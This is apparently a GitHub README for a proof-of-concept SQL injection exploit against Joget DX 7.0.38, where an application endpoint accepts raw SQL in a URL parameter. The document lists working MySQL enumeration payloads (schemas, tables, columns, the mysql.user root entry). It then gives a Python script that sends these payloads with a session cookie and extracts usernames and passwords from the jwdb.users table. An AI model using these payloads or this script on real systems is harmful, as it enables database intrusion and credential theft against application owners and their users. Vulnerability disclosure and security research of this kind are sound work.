# joget-dx7-sql_injection-exploit

A PoC for SQL Injection in Joget DX 7.0.38 application. This PoC allows attacker to enumerate the databases and tables, ip address of the MySQL server as well as enumerate for username and their privileges. 

# Initial Encounter
When exploring the application, we found the following request being called by the application with following response:
```HTTP
GET /jw/web/json/plugin/[REDACTED]/service?raw=yes&sql=select%20ITEM%20from%20TABLE HTTP/2
Host: REDACTED[.]com[.]my
Cookie: JSESSIONID=...; JSESSIONID=...; JSESSIONID=...
```

```http
HTTP/2 200 OK
Content-Type: application/json;charset=utf-8
...

[
	{
		"ITEM":"DATA"
	}
]
```
The sql query is URL encoded, which we can easily decode and replace. 

# Payloads
The following are the successful payloads that allow us to perform information gathering and enumeration.

```sql
# Retrieves database version, username, ip address
SELECT @@VERSION, USER()

# Retrieves all database name
Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

# Retrieves all table for one database
Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

# Retrieves information on user: root
select * from mysql.user where user='root'; 

# Identify Tables Containing "user"
SELECT 1,2,3,group_concat(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema='table' AND table_name LIKE '%user%';

# Identify Columns in the "users" Table
SELECT 1,2,3,group_concat(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_schema='table' AND table_name='users';
```

## Sample Exploit:
![Pasted image 20240626173424](https://github.com/ZulhairyZ/joget-dx7-sql_injection-exploit/assets/152463887/6a96c556-73a3-451e-81dd-4bc9b55c5aed)

# Python Script
```python
import requests

# Base URL and endpoint
base_url = 'http://target.com/vulnerable_endpoint'

# Your authenticated session ID (JSESSIONID) obtained after logging in
session_cookies = {
    'JSESSIONID': 'your_jsessionid_here'
}

# Function to send the SQL injection payload
def send_payload(payload):
    params = {
        'yes': 'yes',
        'sql': payload
    }
    response = requests.get(base_url, params=params, cookies=session_cookies)
    if response.status_code == 200:
        return response.text
    else:
        print("Request failed with status code:", response.status_code)
        return None

# Payload to identify tables containing "user"
tables_payload = "SELECT 1,2,3,group_concat(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema='jwdb' AND table_name LIKE '%user%';"
tables_result = send_payload(tables_payload)
print("Tables containing 'user':", tables_result)

# Assuming the table name is 'users' and it contains 'username' and 'password' columns
# Payload to identify columns in the 'users' table
columns_payload = "SELECT 1,2,3,group_concat(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_schema='jwdb' AND table_name='users';"
columns_result = send_payload(columns_payload)
print("Columns in 'users' table:", columns_result)

# Payload to extract usernames and passwords from 'users' table
data_payload = "SELECT 1,2,3,group_concat(0x7c,username,0x7c,password,0x7C) FROM jwdb.users;"
data_result = send_payload(data_payload)
print("Usernames and passwords:", data_result)
 
```
# Reference: 
- https://book.hacktricks.xyz/pentesting-web/sql-injection#extract-database-names-table-names-and-column-names
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql
- https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf?rss
